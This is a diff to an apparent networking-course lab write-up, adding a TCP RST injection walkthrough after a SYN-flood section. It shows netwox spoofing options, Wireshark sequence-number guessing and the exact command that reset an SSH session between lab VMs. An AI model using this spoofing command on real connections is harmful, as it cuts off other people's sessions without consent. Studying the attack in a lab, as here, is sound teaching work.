@@ -116,4 +116,61 @@ user@client:~$ ssh user@10.2.1.16
 ssh: connect to host 10.2.1.16 port 22: Operation timed out
 ```
 
-We need to specify here that this attack will only affect the port 22 and the SSH service. If telnet was running on port 23 it would not be affected because the each port has its own connection queue.
+We need to specify here that this attack will only affect the port 22 and the SSH service. If telnet was running on port 23 it would not be affected because the each port has its own connection queue. Also, the server will continue operating normally, without any indication that an attack is happening.
+
+### RST attack
+There are two ways to terminate and established TCP connection between two hosts (let's call them A and B). The first way is done with A informing B that it wants to terminate the connection by sending a `FIN` packet and expects and `ACK` from B. If B wants also to terminate his side of the connection (because TCP connections are two one-way "pipes") can also send a `FIN` packet and after `ACK` is received the connection is considered closed.
+The second way is for host A to send a `RST` packet. The `RST` packet will indicate to the receiving host that the connection should be terminated immediately. It is used in situations where there is no time to close the connection using the `FIN` packets and when there are errors detected in the connection.
+Using the `RST` packet, an attacker can terminate an established connection without the consent of any of the legitimate users.
+
+#### Preparation
+We will use again 3 machines, one VM and the host as the legitimate users and the other VM as the attacker (see preparation in the previous attack).
+
+#### Attack
+Considering we know everything about the current connection between the server and the client (both source and destination IP and port number), we need to guess the sequence number because if it's not considered valid by the receiver our(the attacker's) packet will be discarded.
+We will use wireshark to monitor the traffic between the two users and find the sequence number.
+We will also use again the `netwox` program and the tool number 40 which can be used to send any TCP package.
+
+```bash
+user@client:~$ netwox 40 --help
+Title: Spoof Ip4Tcp packet
+Usage: netwox 40 [-c uint32] [-e uint32] [-f|+f] [-g|+g] [-h|+h] [-i uint32] [-j uint32] [-k uint32] [-l ip] [-m ip] [-n ip4opts] [-o port] [-p port] [-q uint32] [-r uint32] [-s|+s] [-t|+t] [-u|+u] [-v|+v] [-w|+w] [-x|+x] [-y|+y] [-z|+z] [-A|+A] [-B|+B] [-C|+C] [-D|+D] [-E uint32] [-F uint32] [-G tcpopts] [-H mixed_data]
+Parameters:
+ -l|--ip4-src ip                IP4 src {10.2.1.27}
+ -m|--ip4-dst ip                IP4 dst {5.6.7.8}
+ -o|--tcp-src port              TCP src {1234}
+ -p|--tcp-dst port              TCP dst {80}
+ -q|--tcp-seqnum uint32         TCP seqnum (rand if unset) {0}
+ -B|--tcp-rst|+B|--no-tcp-rst   TCP rst
+ --help2                        display help for advanced parameters
+ ```
+ (We removed all the unused options from the parameters list because the list was huge)
+
+By monitoring the connection in Wireshark, we can see the current sequence numbers, and we can use them to predict the next one. TCP has a certain "window" so we don't need to be extremely accurate.
+Here are the connections to the server
+
+```bash
+user@server:~$ netstat -tna
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 10.2.1.16:22            10.2.1.5:52494          ESTABLISHED
+tcp6       0      0 :::22                   :::*                    LISTEN
+```
+
+and here is the latest sequence number as captured by Wireshark (Wireshark shows by default the relative sequence number and we need to turn it off)
+
+<img src="https://spanagiot.gr/networks/wireshark_seq.png" >
+
+By inspecting the other packets we can see that the sequence number increases by 36 almost every time, so 1806966531+36=1806966567 will be our guess.
+
+We launch the attack by running
+```bash
+netwox 40 -l 10.2.1.5 -m 10.2.1.16 -o 52494 -p 22 -B -q 1806966567
+```
+
+If we guess correctly, we will see on the client connected to the server this message
+```bash
+user@server:~$ packet_write_wait: Connection to 10.2.1.16 port 22: Broken pipe
+```
+which indicates that our attack was successful!
